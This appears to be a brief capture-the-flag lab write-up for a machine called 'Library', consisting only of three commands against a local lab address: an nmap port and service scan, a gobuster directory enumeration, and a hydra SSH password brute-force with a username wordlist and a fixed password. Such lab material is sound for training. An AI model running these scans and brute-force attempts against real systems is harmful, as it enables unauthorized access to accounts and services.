# Library - Writeup

Raw code
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000
```
```
gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://172.17.0.2/ -x php,html,py 
```
```
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -I
```
